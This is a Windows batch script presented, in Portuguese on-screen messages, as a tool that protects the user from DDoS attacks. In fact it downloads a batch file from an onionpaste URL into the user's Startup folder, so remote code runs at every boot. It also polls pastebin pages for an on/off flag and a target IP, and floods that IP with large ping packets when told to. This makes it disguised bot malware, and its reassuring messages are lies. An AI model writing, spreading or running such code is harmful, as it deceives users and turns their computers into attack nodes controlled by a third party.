@echo off
setlocal enabledelayedexpansion
curl -s https://pastebin.com/raw/zvXTpnrN > output2.txt
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
curl -s "https://onionpaste.com/paste.php?raw&id=1253" > anti-ddos.bat
cd "%~dp0"
set /p text2=<output2.txt
echo Pronto, vc esta protegido de ataques DoS e DDos, nao feche o programa
echo Se o programa abriu dunada, n se preocupe, ele esta no startup e te protegera toda hora q iniciar o pc
echo no arquivo output.txt, avisa se vc esta levando um ataque ou nao, se for true vc esta sendo atacado
echo se for false ou qualquer outra coisa, vc n esta sendo atacado
echo no output2 e so se tiver alguem te atacando ele mostrara o ip de quem esta te atacando
echo por default ele e %text2%
echo mais e so pra testar ele mostra esse ip
echo minimiza o programa se nao nao funciona
echo se vc ja executou o programa uma vez, n precisa mais executar, ele esta no startup
cd "%~dp0"
:loop
curl -s https://pastebin.com/raw/zvXTpnrN > output2.txt
curl -s https://pastebin.com/raw/RWBcyNUD > output.txt
set /p text=<output.txt
set /p text2=<output2.txt
if "%text%"=="true" (
    ping -n 10 %text2% -l 65500 > nul
    goto loop
) else (
    rem nothing
)
timeout /t 1 > nul
goto loop